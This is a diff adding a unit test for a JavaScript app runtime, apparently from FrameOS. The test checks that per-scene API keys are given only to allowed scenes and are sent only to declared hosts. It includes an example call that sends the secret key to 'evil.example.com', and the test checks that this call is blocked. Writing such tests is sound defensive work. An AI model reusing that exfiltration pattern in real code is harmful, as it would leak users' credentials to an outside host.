@@ -2160,6 +2160,59 @@ suite "js app runtime":
     check payload["denied"].kind == JNull
     check config.settings["openAI"]["apiKey"].getStr() == "sk-plane"
 
+  test "getSetting answers the app's own scene's key, secret fills it on the way out":
+    # docs/service-keys.md: the frame's `serviceKeys` say which scene gets
+    # which key; a scene the owner refused gets none though the frame has one.
+    var sent: seq[string]
+    jsHttpRequestHook = proc(url, httpMethod, body: string,
+        headers: seq[SimpleHttpHeader]): tuple[code: int, body: string] =
+      var line = url
+      for (name, value) in headers:
+        line.add " " & name & "=" & value
+      sent.add line
+      (200, "{}")
+    defer: jsHttpRequestHook = nil
+    let config = testConfig()
+    config.settings = %*{"openAI": {"apiKey": "sk-default"}}
+    config.serviceKeys = %*{
+      "v": 1,
+      "keys": {"k_work0000001": {"service": "openAI", "values": {"apiKey": "sk-work"}}},
+      "scenes": {"work": {"openAI": "k_work0000001"}, "store": {"openAI": nil}},
+      "services": {"openAI": {"title": "OpenAI", "fields": [{"name": "apiKey", "label": "API key"}],
+        "hosts": ["api.openai.com"]}},
+    }
+    let logger = testLogger(config)
+    let source = """export function get(app) {
+        const secret = frameos.secret("openAI", "apiKey")
+        const ok = frameos.httpRequest("https://api.openai.com/v1/x", {headers: {Authorization: "Bearer " + secret}})
+        const away = frameos.httpRequest("https://evil.example.com/", {headers: {Authorization: secret}})
+        return {key: frameos.getSetting("openAI", "apiKey") ?? null, secret: secret ?? null,
+          ok: ok.status, away: away.error ?? null,
+          undeclared: frameos.secret("unsplash", "accessKey") ?? null}
+      }"""
+    proc run(sceneId: string): JsonNode =
+      let scene = FrameScene(id: sceneId.SceneId, frameConfig: config, state: %*{}, logger: logger)
+      let owner = AppRoot(nodeId: 24.NodeId, nodeName: "jsKeys", scene: scene, frameConfig: config)
+      let context = ExecutionContext(scene: scene, event: "render", payload: %*{}, hasImage: false, loopIndex: 0,
+        loopKey: ".", nextSleep: -1)
+      let runtime = newJsAppRuntime(category = "data", outputType = "json", source = source,
+        settingsKeys = @["openAI"])
+      runtime.get(owner, %*{}, context).asJson()
+    let work = run("work")
+    check work["key"].getStr() == "sk-work"
+    check work["secret"].getStr() == "{{key:openAI.apiKey}}"
+    check work["ok"].getInt() == 200
+    check work["away"].getStr() == "key not allowed: host (https://evil.example.com:443)"
+    check work["undeclared"].kind == JNull
+    check sent == @["https://api.openai.com/v1/x Authorization=Bearer sk-work"]
+    sent.setLen(0)
+    let store = run("store")
+    # Refused: no key, no placeholder, and no key in anything it sent.
+    check store["key"].kind == JNull
+    check store["secret"].kind == JNull
+    for line in sent:
+      check "sk-" notin line
+
   test "releases overwritten dynamic field image refs":
     let config = testConfig()
     let logger = testLogger(config)
